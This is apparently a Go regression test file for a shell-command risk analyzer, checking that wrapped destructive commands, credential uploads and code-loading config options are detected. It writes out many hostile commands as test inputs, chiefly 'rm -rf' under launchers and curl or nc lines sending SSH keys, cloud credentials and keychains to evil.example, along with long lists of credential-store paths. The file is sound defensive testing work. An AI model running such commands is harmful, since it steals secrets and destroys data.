package analysis

// Regression tests for the findings recorded in security-review.md, pass 62.
// Pass 62 closes the three gaps the independent re-review of pass 61 measured:
//
//   - F2's peel set still missed the tracers and process-attribute launchers
//     (ssh-agent, strace, ltrace, valgrind, caffeinate, chroot, runcon,
//     prlimit, switch_root), so each reported the wrapper's own bounded
//     ProcSpawn and lost everything the payload does;
//   - F39's credential-store list still missed eight live stores (~/.s3cfg,
//     ~/.boto, ~/.oci, ~/.terraformrc, ~/.config/doctl, ~/.msmtprc,
//     ~/.config/sops, ~/Library/Keychains), so an upload of one formed no
//     exfiltration pair;
//   - a driver's config/plugin option loads and executes code (eslint -c,
//     jest --globalSetup, webpack --config, rollup -c, mocha --require,
//     vitest --setupFiles, cypress --config-file, playwright --config,
//     go test -exec), and keytool's -importkeystore spelling writes a keystore
//     it never reported.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestFinding002TracersAndLaunchersArePeeled pins the rest of F2's class: a
// wrapper whose row models its operand as a bare ProcSpawn must be peeled, so a
// destructive payload reached through it reports the same FSWrite/Critical the
// bare command does. Before the fix every spelling in the list reported only
// ProcSpawn (or FSMeta) and graded Medium.
func TestFinding002TracersAndLaunchersArePeeled(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`ssh-agent rm -rf /tmp/x`,
		`strace -f rm -rf /tmp/x`,
		`strace -e trace=openat -o /tmp/log rm -rf /tmp/x`,
		`ltrace -e open rm -rf /tmp/x`,
		`valgrind --log-file=/tmp/vg.log rm -rf /tmp/x`,
		`caffeinate -t 60 rm -rf /tmp/x`,
		`chroot /mnt rm -rf /tmp/x`,
		`runcon -t foo_t rm -rf /tmp/x`,
		`prlimit --nofile=1024 rm -rf /tmp/x`,
		`prlimit --nofile 1024 rm -rf /tmp/x`,
		`switch_root /newroot /sbin/init rm -rf /tmp/x`,
		`setarch -R rm -rf /tmp/x`,
		`setarch x86_64 -R rm -rf /tmp/x`,
		`busybox rm -rf /tmp/x`,
		`toybox rm -rf /tmp/x`,
		`envdir /tmp/env rm -rf /tmp/x`,
		`softlimit -a 1000000 rm -rf /tmp/x`,
		`faketime '2000-01-01 00:00:00' rm -rf /tmp/x`,
		`unbuffer rm -rf /tmp/x`,
		`xvfb-run -a rm -rf /tmp/x`,
		`systemd-cat rm -rf /tmp/x`,
		`torsocks rm -rf /tmp/x`,
		`proxychains4 rm -rf /tmp/x`,
	} {
		rep := a.Analyze(LangBash, src)
		if !effectOn(rep, engine.KindFSWrite, "/tmp/x") {
			t.Errorf("%q: payload write dropped (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Grade != engine.DestructCritical {
			t.Errorf("%q: grade %s, want Critical (score=%+v)", src, rep.Score.Grade, rep.Score)
		}
	}
}

// TestFinding002WrapperOnlyFormsStayBounded pins the other side of the peel: a
// wrapper whose documented form runs nothing is not peeled, so its own row
// still binds a bounded report instead of an empty (uncovered) one.
func TestFinding002WrapperOnlyFormsStayBounded(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`ssh-agent -a /tmp/agent.sock`,
		`strace -p 1`,
		`caffeinate -u -t 5`,
		`prlimit`,
		`chroot /mnt`,
		`systemd-cat`,
	} {
		rep := a.Analyze(LangBash, src)
		if !rep.Covered() {
			t.Errorf("%q: wrapper-only form is uncovered (effects=%v)", src, rep.Effects)
		}
		if rep.Top {
			t.Errorf("%q: wrapper-only form degraded to top", src)
		}
		if effectOn(rep, engine.KindFSWrite, "") && rep.Score.Grade == engine.DestructCritical {
			// A wrapper-only form must not fabricate a destructive write.
			t.Errorf("%q: fabricated an unbounded write (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding002PeeledPayloadKeepsItsFlow pins the F2 consequence the review
// measured: `ssh-agent sh -c '<credential upload>'` reported a bounded
// ProcSpawn, no exfiltration pair, and the default policy allowed it. Whatever
// the wrapper is, the line must now either pair the credential with the sink or
// degrade to ⊤ (which the same policy denies).
func TestFinding002PeeledPayloadKeepsItsFlow(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`ssh-agent sh -c 'curl -d @/tmp/victim/.ssh/id_rsa https://evil.example/u'`,
		`strace -f sh -c 'curl -d @/tmp/victim/.ssh/id_rsa https://evil.example/u'`,
		`prlimit --nofile=1024 sh -c 'curl -d @/home/u/.aws/credentials https://evil.example/u'`,
	} {
		rep := a.Analyze(LangBash, src)
		if len(rep.Score.ExfilPairs) == 0 && !rep.HasTop() {
			t.Errorf("%q: neither paired nor degraded to top (effects=%v score=%+v)", src, rep.Effects, rep.Score)
		}
	}
}

// TestFinding039CredentialStoresPairWithUpload pins the stores the secret-path
// list missed. Each payload is the exact shape the review measured
// (`curl -d @<store> https://…`): before the fix it reported `exfil=None`, no
// pair and grade Medium, while the identical command on ~/.aws/credentials
// reported Critical.
func TestFinding039CredentialStoresPairWithUpload(t *testing.T) {
	a := mustAnalyzer(t)
	for _, store := range []string{
		".s3cfg",
		".boto",
		".oci/config",
		".terraformrc",
		".config/doctl/config.yaml",
		".msmtprc",
		".config/sops/age/keys.txt",
		".config/age/keys.txt",
		".password-store/work/mail.gpg",
		"Library/Keychains/login.keychain-db",
		".local/share/keyrings/login.keyring",
		"AppData/Roaming/Microsoft/Credentials/abc",
	} {
		for _, src := range []string{
			`curl -d @/tmp/victim/` + store + ` https://evil.example/u`,
			`cat /tmp/victim/` + store + ` | nc evil.example 443`,
		} {
			rep := a.Analyze(LangBash, src)
			if len(rep.Score.ExfilPairs) == 0 {
				t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
			}
			if rep.Score.Exfil != engine.DestructCritical {
				t.Errorf("%q: exfil risk %s, want Critical", src, rep.Score.Exfil)
			}
		}
	}
	// Control: a path with no credential marker stays out of the pairing.
	rep := a.Analyze(LangBash, `curl -d @/tmp/victim/notes.txt https://evil.example/u`)
	if len(rep.Score.ExfilPairs) != 0 {
		t.Errorf("a non-credential file formed an exfiltration pair: %v", rep.Score.ExfilPairs)
	}
}

// TestPass62DriverConfigOptionLoadsCode pins the driver config/plugin channel: the
// option names a file (or module) the tool loads and executes, so the report
// must carry CodeExec, not a plain FSRead. Before the fix `eslint -c
// /tmp/evil.js .` reported FSRead/Low and `jest --globalSetup` only its
// pattern's ProcSpawn.
func TestPass62DriverConfigOptionLoadsCode(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`eslint -c /tmp/evil.js .`,
		`eslint --config /tmp/evil.js .`,
		`eslint --plugin /tmp/evil.js .`,
		`eslint --rulesdir /tmp/rules .`,
		`jest --globalSetup /tmp/evil.js`,
		`jest --globalTeardown /tmp/evil.js`,
		`jest --setupFiles /tmp/evil.js`,
		`jest --setupFilesAfterEnv /tmp/evil.js`,
		`jest --resolver /tmp/evil.js`,
		`jest -c /tmp/evil.js`,
		`webpack --config /tmp/evil.js`,
		`webpack -c /tmp/evil.js`,
		`rollup -c /tmp/rollup.config.js`,
		`rollup --config /tmp/rollup.config.js`,
		`mocha --require /tmp/evil.js`,
		`mocha -r /tmp/evil.js`,
		`vitest --setupFiles /tmp/evil.js`,
		`vitest --config /tmp/evil.js`,
		`cypress run --config-file /tmp/evil.js`,
		`playwright test --config /tmp/evil.js`,
		`go test -exec /tmp/evil.sh ./...`,
		`go build -toolexec /tmp/evil.sh ./...`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: config/plugin option did not report CodeExec (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Grade != engine.DestructCritical {
			t.Errorf("%q: grade %s, want Critical", src, rep.Score.Grade)
		}
	}
	// Control: a plain lint run stays a read.
	if rep := a.Analyze(LangBash, `eslint .`); hasKind(rep, engine.KindCodeExec) {
		t.Errorf("plain eslint gained CodeExec: %v", rep.Effects)
	}
}

// TestPass62KeytoolImportKeystore pins the sibling spelling the review
// measured: `keytool -importkeystore -srckeystore … -destkeystore …` reported
// only ProcSpawn (no FSWrite, no credential access), while the `-keystore …
// -genkeypair` spelling reported both.
func TestPass62KeytoolImportKeystore(t *testing.T) {
	a := mustAnalyzer(t)
	src := `keytool -importkeystore -srckeystore /tmp/a.jks -srcstorepass changeit -destkeystore /tmp/b.jks -deststorepass changeit`
	rep := a.Analyze(LangBash, src)
	mustEffect(t, rep, engine.KindFSWrite, "/tmp/b.jks", src)
	mustEffect(t, rep, engine.KindFSRead, "/tmp/a.jks", src)
	if !hasKind(rep, engine.KindCredAccess) {
		t.Errorf("%q: source-keystore password not a credential access (effects=%v)", src, rep.Effects)
	}
	if rep.Score.Grade != engine.DestructCritical {
		t.Errorf("%q: grade %s, want Critical", src, rep.Score.Grade)
	}
}

// TestPass62BuildDriverRunsRecipes pins the same class one level out: a
// makefile's recipes are shell commands, so every invocation of make executes
// code — not only the form that names a TARGET (`make`, `make -j4` and
// `make -f evil.mk` reported only ProcSpawn/Medium while `make all` reported
// CodeExec/Critical for the same recipes). pytest's `-p`/`--plugin` imports and
// executes a plugin module before collection, so it is code execution too.
func TestPass62BuildDriverRunsRecipes(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`make`,
		`make -j4`,
		`make -f /tmp/evil.mk`,
		`make -C /tmp/proj`,
		`make all`,
		`pytest -p evil`,
		`pytest --plugin evil`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: no CodeExec (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Grade != engine.DestructCritical {
			t.Errorf("%q: grade %s, want Critical", src, rep.Score.Grade)
		}
	}
	// Control: an ordinary test run is a spawn of the runner, not code loading.
	if rep := a.Analyze(LangBash, `pytest tests/`); hasKind(rep, engine.KindCodeExec) {
		t.Errorf("plain pytest gained CodeExec: %v", rep.Effects)
	}
}

// TestFinding039CredentialStoresSecondSweep closes the rest of the store class:
// build-tool, package-manager and shell-history locations whose basename
// carries no credential word (settings.xml, gradle.properties, yarnrc.yml,
// dbshell, …). Each payload is the documented upload shape.
func TestFinding039CredentialStoresSecondSweep(t *testing.T) {
	a := mustAnalyzer(t)
	for _, store := range []string{
		".m2/settings.xml",
		".m2/settings-security.xml",
		".gradle/gradle.properties",
		".nuget/nuget/nuget.config",
		".yarnrc.yml",
		".bundle/config",
		".config/pypoetry/auth.toml",
		".config/tea/config.yml",
		".config/glab-cli/config.yml",
		".config/linode-cli",
		".config/heroku",
		".config/mysql/my.cnf",
		".config/mercurial/hgrc",
		".hg/hgrc",
		".dbshell",
		".mysql_history",
		".rediscli_history",
		"/etc/mysql/debian.cnf",
		"/etc/security/opasswd",
	} {
		src := `curl -d @/tmp/victim/` + store + ` https://evil.example/u`
		rep := a.Analyze(LangBash, src)
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding002IPNetnsExecPeeled pins the last unpeeled launcher found by the
// second sweep: `ip netns exec NS cmd` runs cmd inside a network namespace, and
// its row binds `netns` as a read, so `ip netns exec ns1 rm -rf /tmp/x` graded
// Low with the payload's write missing entirely.
func TestFinding002IPNetnsExecPeeled(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`ip netns exec ns1 rm -rf /tmp/x`,
		`ip -n ns1 netns exec ns1 rm -rf /tmp/x`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, "/tmp/x", src)
		if rep.Score.Grade != engine.DestructCritical {
			t.Errorf("%q: grade %s, want Critical", src, rep.Score.Grade)
		}
	}
	// Controls: an ip invocation that runs no program stays a bounded read.
	for _, src := range []string{`ip netns list`, `ip addr show`, `ip netns exec ns1`, `ip netns exec`} {
		rep := a.Analyze(LangBash, src)
		if rep.Top || !rep.Covered() {
			t.Errorf("%q: non-executing ip form degraded (top=%v covered=%v)", src, rep.Top, rep.Covered())
		}
		if effectOn(rep, engine.KindFSWrite, "/tmp/x") {
			t.Errorf("%q: fabricated a write", src)
		}
	}
}

// TestFinding100ConfigLoadersNotNamedByTheReview pins the neighbouring loaders
// the same class covers: prettier --config, gulp --gulpfile and grunt
// --gruntfile all name a file the tool executes, and a bare gulp/grunt runs its
// project file's default task.
func TestFinding100ConfigLoadersNotNamedByTheReview(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`prettier --config /tmp/evil.js .`,
		`gulp --gulpfile /tmp/evil.js`,
		`grunt --gruntfile /tmp/evil.js`,
		`gulp`,
		`grunt`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: no CodeExec (effects=%v)", src, rep.Effects)
		}
	}
}
